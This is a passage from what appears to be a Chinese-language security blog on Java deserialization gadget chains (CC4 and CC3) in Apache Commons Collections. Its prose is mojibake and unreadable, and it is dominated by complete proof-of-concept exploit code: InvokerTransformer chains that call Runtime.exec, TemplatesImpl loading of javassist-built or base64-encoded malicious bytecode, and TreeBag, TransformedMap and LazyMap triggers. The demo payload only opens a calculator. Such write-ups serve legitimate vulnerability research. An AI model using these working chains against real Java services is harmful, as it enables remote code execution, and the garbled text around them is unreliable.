è¿™é‡Œä¹Ÿå°±æ˜¯çœ‹æ˜¯å¦æœ‰å€¼ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬å¹¶æ²¡æœ‰å¾€é‡Œé¢ä¼ è¿‡å€¼ï¼Œé‚£ä¹ˆmutå°±ä¸ºnullï¼Œè¿™æ ·å°±è¿›å…¥TreeMapç±»çš„put()æ–¹æ³•ï¼š\nå†çœ‹putæ–¹æ³•æºç ï¼š è¿™é‡Œå¾ˆè‡ªç„¶å°±ä¼šä½¿å¾—sizeä¸º1ã€‚\nâ€”â€”â€”â€”â€”â€”\nä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„ä¼šè°ƒç”¨compare()æ–¹æ³•ï¼Œå‰é¢ä¹Ÿè¯´è¿‡è¿™ä¸ªæ–¹æ³•äº†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å‡çš„è¯åº”è¯¥ä¼šå¯¼è‡´å¼¹ä¸¤ä¸ªè®¡ç®—æœºï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹äº†ä¸¤ä¸ªè®¡ç®—æœºã€‚æƒ³æ³•æˆç«‹ã€‚\nä½†æ˜¯åœ¨å‰é¢åŸºæœ¬æµç¨‹è®²è§£çš„è¿‡ç¨‹ä¸­ï¼Œé—ç•™äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œç›®çš„åŒæ ·æ˜¯è°ƒç”¨è¿™ä¸ªput()æ–¹æ³•ï¼š æ‰€ä»¥è¯´ä¼šè¿›å…¥TreeMapç±»çš„put()æ–¹æ³•ï¼š\né‡ç‚¹å…¶å®ä¹Ÿæ ‡æ³¨å‡ºæ¥äº†ï¼Œä¸»ä¹‰çœ‹å‰é¢åºåˆ—åŒ–ä¹‹å‰ä¼šè°ƒç”¨è¿™ä¸ªput()æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªput()æ–¹æ³•ä¸­å°†rootå˜é‡èµ‹å€¼äº†ï¼Œè¿™å°±è®©rootä¸å†æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ä¸ºä»€ä¹ˆå¯ä»¥è¿›å…¥å‘¢ï¼Œå…¶å®è¿˜æ˜¯å› ä¸ºrootè¢«transientå…³é”®å­—ä¿®é¥°äº†ï¼Œå¯¼è‡´ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œæ•…è€Œåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿå¯ä»¥è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œä»è€ŒæˆåŠŸè°ƒç”¨compare()æ–¹æ³•ã€‚\nâ€”â€”â€”â€”â€”â€”\nOKï¼Œé‚£ä¹ˆå°±é€šäº†ï¼Œåªè¦è¿™é‡Œsizeä¸º1å°±å¯ä»¥æˆåŠŸä½¿å¾—this.map.size()è¿”å›1ï¼Œè¿™æ ·åºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥åºåˆ—åŒ–1äº†ï¼Œååºåˆ—åŒ–è¯»å–çš„æ—¶å€™ä¹Ÿä¸æ˜¯0äº†ï¼Œä»è€ŒæˆåŠŸå¯ä»¥è¿›å…¥forå¾ªç¯ã€‚\næ¡ä»¶åŸºæœ¬éƒ½è¯´æ˜äº†ï¼Œç›´æ¥ä¸Šä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(treeBag); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºé¢„æœŸçš„ä¸¤ä¸ªè®¡ç®—æœº\njavassistè¡¥å…… é‚£ä¹ˆåŒæ ·çš„åˆ©ç”¨javassistä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œå°±æ˜¯æ³¨æ„ä¸€ä¸‹å‰é¢è¯´çš„éœ€è¦å…³æ³¨compareçš„å€¼ï¼š å‰é¢çš„ç†è®ºè¿‡ç¨‹æ‡‚äº†çš„è¯å°±åŸºæœ¬æ²¡æœ‰é—®é¢˜äº†ï¼Œå°±æ˜¯ä¸‹é¢çš„keyéœ€è¦ä¸ºTemplatesImplç±»å®ä¾‹ï¼š è¿™é‡ŒåŒæ ·éœ€è¦æ³¨æ„add()æ—¶å¼¹å‡ºè®¡ç®—æœºçš„é—®é¢˜ï¼Œç›´æ¥åœ¨ä¸‹é¢çš„POCä¸€å¹¶è§£å†³äº†\nå¯ä»¥æ„é€ å¦‚ä¸‹POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(transformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } å¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºï¼Œè¿˜æ˜¯ç®—é¢„æœŸçš„ï¼Œaddä¸€æ¬¡ï¼Œååºåˆ—åŒ–ä¸€æ¬¡ï¼Œå’ŒCC2é‚£é‡Œæ˜¯æœ‰åŒºåˆ«çš„ï¼Œè°ƒè¯•äº†ä¸€ä¸‹å¥½åƒæ˜¯åœ¨ç¬¬ä¸€æ¬¡æˆåŠŸè°ƒç”¨transformåæŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´ä¸èƒ½è°ƒç”¨åˆ°ç¬¬äºŒä¸ªtransformã€‚\nä½†æ˜¯è¿™é‡ŒåŒæ ·éœ€è¦æ³¨æ„addæ—¶ä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œä¼šå…ˆå¼¹ä¸€æ¬¡è®¡ç®—æœºï¼Œæ‰€ä»¥è¿˜æ˜¯å…ˆå‡å†åå°„æ›´æ”¹æ¥é˜²æ­¢åºåˆ—åŒ–å‰å¼¹ã€‚\næ‰€ä»¥æœ€ç»ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ ConstantTransformer fakeTransformer = new ConstantTransformer(1); Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(fakeTransformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(comparator1,transformer); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸå¼¹å‡ºé¢„æœŸçš„ä¸€ä¸ªè®¡ç®—æœºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œèƒ½ç›´æ¥åå°„ä¿®æ”¹finalä¿®é¥°çš„transformerï¼Œæ­£å¸¸åº”è¯¥æ˜¯ï¼š\n1 2 3 4 5 6 7 8 import java.lang.reflect.Modifier; Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); Field modifiersField = Field.class.getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(field1, field1.getModifiers() \u0026amp; ~Modifier.FINAL); field1.set(comparator1,transformer); OKï¼Œé“¾å­å®Œç»“äº†ã€‚\n","date":"2025-01-22T13:52:14+08:00","permalink":"https://fupanc-w1n.github.io/p/cc4/","title":"CC4"},{"content":"CC3 CC3å°±æ˜¯å°†CC1å’ŒCC6è°ƒç”¨é“¾å’ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç åŠ åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥éœ€è¦æœ‰åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„çŸ¥è¯†ã€‚\nåˆ©ç”¨TemplatesImplæ„é€ CC3 åœ¨å‰é¢åšå®¢çš„æ–‡ç« ä¸­ï¼Œè®²è¿°äº†Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±è¯´æ˜äº†TemplatesImplçš„ç”¨æ³•ï¼Œé€šè¿‡è°ƒç”¨å…¶newTransformer()æ¥å®ç°é“¾å­çš„èµ·ç‚¹\nåœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç ä¸­ï¼Œåˆ©ç”¨TemplatesImplæ„å»ºçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ctf.newTransformer(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æ¶æ„ç±»çš„ç¤ºä¾‹ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } æƒ³è¦åœ¨ååºåˆ—åŒ–ä¸­åˆ©ç”¨TemplatesImplæ¥åŠ è½½å­—èŠ‚ç ï¼Œéœ€è¦åœ¨ååºåˆ—åŒ–ä¸­æ‰§è¡ŒTemplatesImplå¯¹è±¡çš„newTransformeræˆ–getOutputPropertiesæ–¹æ³•\nç»“åˆåœ¨CC1ä¸­çš„TransformedMapé“¾çš„åŸºæœ¬ä»£ç çš„ç®€åŒ–ä»£ç ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯çœ‹å¦‚ä½•æ¥å…¥äº†CCé“¾äº†\nç»“åˆCC1 æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u65 CC3ï¼ˆTransformedMapé“¾ï¼‰ POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.util.Base64; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAQb3JnL2V4YW1wbGUvVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAoABAALAA0ADAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå…¶å®å°±æ˜¯å°†å‰é¢çš„é“¾å¼æ‰§è¡Œå‘½ä»¤æ”¹äº†ä¸€ä¸‹ã€‚\nè¿™é‡Œè¦è¯´æ˜ä¸€ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯åˆ©ç”¨é“¾çš„InvokerTransformeråˆå§‹åŒ–é‚£é‡Œï¼Œå¯ä»¥å’Œå‰é¢çš„CC1å¯¹æ¯”ä¸€ä¸‹ï¼š\nå¦‚æœ paramTypes å’Œ args æ˜¯ nullï¼Œå®ƒä»¬è¡¨ç¤ºè¯¥æ–¹æ³•æ²¡æœ‰å‚æ•°ã€‚è€Œå¦‚æœå®ƒä»¬æ˜¯ new Class[]{null} å’Œ new Object[]{null}ï¼Œè¿™å®é™…ä¸Šæ˜¯è¡¨ç¤ºè¯¥æ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¯¥å‚æ•°çš„ç±»å‹å’Œå€¼éƒ½æ˜¯ nullï¼Œè¿™ç§æƒ…å†µå¾ˆå¯èƒ½å¯¼è‡´æ–¹æ³•è°ƒç”¨å¤±è´¥ï¼Œå› ä¸ºå®é™…è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œè€Œä»£ç å´è¯•å›¾ç”¨ä¸€ä¸ª null ç±»å‹å’Œ null å€¼è¿›è¡Œè°ƒç”¨ã€‚\næ‰€ä»¥ä¸Šé¢ä»£ç éœ€è¦ç›´æ¥ç”¨ä¸¤ä¸ªnullè¡¨ç¤ºæ— å‚æ•°çš„æ–¹æ³•\nCC3ï¼ˆLazyMapé“¾ï¼‰ POCï¼ˆå‰é¢ç”¨çš„base64ï¼Œè¿™é‡Œå°±ç”¨IOè¯»æ–‡ä»¶ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.lang.reflect.InvocationHandler; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object 